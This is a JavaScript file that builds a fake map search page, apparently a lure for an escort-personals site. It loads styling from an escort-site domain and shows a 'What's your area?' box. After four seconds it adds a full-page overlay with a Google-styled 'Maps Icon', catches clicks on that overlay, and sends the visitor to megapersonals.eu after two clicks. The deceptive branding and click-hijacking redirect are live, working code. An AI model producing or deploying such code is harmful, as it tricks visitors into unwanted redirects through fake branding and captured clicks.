// Create and append stylesheet link
const link = document.createElement('link');
link.rel = 'stylesheet';
link.type = 'text/css';
link.href = 'https://test.escortbabylone.info/css/stylemap.css';
document.head.appendChild(link);

// Create map iframe
const body = document.body;
const mapIframe = document.createElement('iframe');
mapIframe.classList.add('map-background');
mapIframe.src = ''; // Placeholder for the map URL
mapIframe.width = '1200';
mapIframe.height = '1200';
mapIframe.style.border = '0';
mapIframe.allowFullscreen = true;

// Create overlay
const overlay = document.createElement('div');
overlay.classList.add('overlay');

// Create Google button overlay
const googleButtonOverlay = document.createElement('a');
googleButtonOverlay.href = '#';
googleButtonOverlay.classList.add('google-button-overlay');
googleButtonOverlay.id = 'googleButtonOverlay';

// Google icon inside the overlay
const googleIcon = document.createElement('img');
googleIcon.src = 'https://newsite-livid.vercel.app/megapic.jpg';
googleIcon.alt = 'Maps Icon';
googleIcon.width = '130';
googleIcon.height = '300';

// Google label
const googleLabel = document.createElement('label');
googleLabel.setAttribute('for', 'accept');
googleLabel.textContent = ' ';

// Append Google elements
googleButtonOverlay.appendChild(googleIcon);
googleButtonOverlay.appendChild(googleLabel);
overlay.appendChild(googleButtonOverlay);

// Create main container
const container = document.createElement('div');
container.classList.add('container');
container.style.backgroundImage = "url('https://newsite-livid.vercel.app/megapic.jpg')";

// Create input section
const inputSection = document.createElement('div');
inputSection.classList.add('input-section');

const areaLabel = document.createElement('label');
areaLabel.setAttribute('for', 'area');
areaLabel.textContent = "What's your area?";

const hiddenInput = document.createElement('input');
hiddenInput.type = 'hidden';
hiddenInput.id = 'area';
hiddenInput.name = 'area';

inputSection.appendChild(areaLabel);
inputSection.appendChild(document.createElement('br'));
inputSection.appendChild(hiddenInput);

// Create search container
const searchContainer = document.createElement('div');
searchContainer.classList.add('search-container');

const searchInput = document.createElement('input');
searchInput.style.border = '1px solid #6565c5';
searchInput.style.outline = 'none';
searchInput.type = 'text';
searchInput.placeholder = 'Search...';

const searchIcon = document.createElement('i');
searchIcon.id = 'searchIcon';
searchIcon.classList.add('fa', 'fa-search');
searchIcon.style.fontSize = '20px';
searchIcon.style.color = '#6565c5';
searchIcon.style.padding = '7px';

const clearButton = document.createElement('button');
clearButton.classList.add('clear-btn');
clearButton.innerHTML = '&times;';

// Append search elements
searchContainer.appendChild(searchInput);
searchContainer.appendChild(searchIcon);
searchContainer.appendChild(clearButton);
inputSection.appendChild(searchContainer);
container.appendChild(inputSection);

// Append elements to DOM
body.appendChild(mapIframe);
body.appendChild(overlay);
body.appendChild(container);

// Show overlay after 4 seconds
document.addEventListener('DOMContentLoaded', function () {
    setTimeout(() => {
        document.querySelector('.overlay').style.display = 'block';
    }, 4000);
});

// Create accept button
const acceptButton = document.createElement('label');
acceptButton.classList.add('accept-button');

let clickCount = 0;
acceptButton.addEventListener('click', () => {
    clickCount++;
    if (clickCount === 2) {
        window.location.href = 'https://megapersonals.eu';
    }
});

overlay.appendChild(acceptButton);

// Overlay click handler to trigger accept button
overlay.addEventListener('click', function () {
    acceptButton.click();
});
